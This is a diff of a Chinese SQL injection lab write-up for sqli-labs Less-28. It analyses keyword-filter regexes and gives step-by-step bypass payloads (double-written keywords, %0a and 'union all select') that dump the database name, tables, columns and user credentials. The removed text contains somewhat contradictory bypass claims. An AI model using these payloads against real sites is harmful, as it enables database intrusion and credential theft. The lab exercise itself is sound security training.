@@ -1,55 +1,71 @@
-# Less-28 正则 UNION/SELECT 过滤（大小写不敏感）
+# Less-28 （union\s+select 词组过滤）
 
-## 源码分析
-
+## 查看分析源码
 ```php
-// 正则大小写不敏感 /i
-$id= preg_replace('/union|select/i',"", $id);
-$id= preg_replace('/[\s]/',"", $id);
-$id= preg_replace('/[\/\*]/',"", $id);
+$id= preg_replace('/[\/\*]/',"", $id);              // strip /*
+$id= preg_replace('/[--]/',"", $id);                 // --
+$id= preg_replace('/[#]/',"", $id);                  // #
+$id= preg_replace('/[ +]/',"", $id);                 // 空格和+
+$id= preg_replace('/[ +]/',"", $id);                 // 又来一次
+$id= preg_replace('/union\s+select/i',"", $id);     // ★ 只拦 union 空格 select
 ```
 
-比 Less 27 更严格：
-- `UnIon`、`UNION`、`union` 全部拦截（因为 `/i` 标志）
-- `/**/` 注释也被过滤
+和 Less-27 最大的区别：这里只拦 `union\s+select` 这个词组，不是单独拦 `union` 和 `select`
 
-## 绕过方案
+`select` 单独能用，`union` 单独也能用，但不能写在一起中间有空白
 
-### 方案 A：注释拆分（最推荐）
-用 `/**/` 虽然被过滤，但有些版本只过滤了 `/*` 开头组合。优先试：
+但问题是：
 
-```sql
-?id=-1' un/**/ion sel/**/ect 1,database(),3--+
+```
+union select       → 被删（中间有空格）
+union%0aselect     → %0a 是 \s，也被删
+union ALL select   → 中间有 ALL，不匹配 \s+，安全
+union/**/select    → /* / * 被 [\/\*] 干掉，变成 unionselect，不行
 ```
 
-### 方案 B：双写绕过（核心技巧）
-正则替换为空 → 双写后剩下正常关键字：
+所以绕过方法就是往中间插个词打断匹配
 
-```sql
--- 过滤 "union" → 剩下 union → 正常拼接
-?id=-1' ununionion selselectect 1,database(),3--+
+SQL 语句是 `('$id')`，括号闭合：
+
+```
+id=('-1') union all select 1,2,3 or '1'='1' LIMIT 0,1
 ```
 
-原理：
-- `ununionion` → 正则匹配到 `union` 替换为空 → 剩下 `union`
-- `selselectect` → 正则匹配到 `select` 替换为空 → 剩下 `select`
+## order by
 
-### 方案 C：换行符 %0a
-```sql
-?id=-1' union%0aselect%0a1,database(),3--+
+```
+?id=1')%0aorder%0aby%0a3%0aor%0a'1'='1
+?id=1')%0aorder%0aby%0a4%0aor%0a'1'='1
 ```
 
-### 方案 D：URL 编码空格
-```sql
-?id=-1'%09union%09select%091,2,3--+
+## 回显位
+
+```
+?id=-1')%0aunion%0aall%0aselect%0a1,2,3%0aor%0a'1'='1
 ```
 
-## 完整 Payload 链
+## 爆库名
 
-```sql
--- 方案 B 双写
-?id=-1' ununionion selselectect 1,database(),3--+
-?id=-1' ununionion selselectect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
-?id=-1' ununionion selselectect 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
-?id=-1' ununionion selselectect 1,group_concat(username,0x3a,password),3 from users--+
 ```
+?id=-1')%0aunion%0aall%0aselect%0a1,database(),3%0aor%0a'1'='1
+```
+
+## 爆表名
+
+```
+?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0aor%0a'1'='1
+```
+
+## 爆列名
+
+```
+?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users'%0aor%0a'1'='1
+```
+
+## 爆数据
+
+```
+?id=-1')%0aunion%0aall%0aselect%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0aor%0a'1'='1
+```
+
+总结：`union\s+select` 只拦两个关键字中间带空白的情况，插个 `ALL` 进去就断了。注意 `union%0aselect` 不行——`%0a` 属于 `\s`，反而会被匹配到。用 `union%0aall%0aselect` 就没事。没有报错回显但数据正常时出结果。
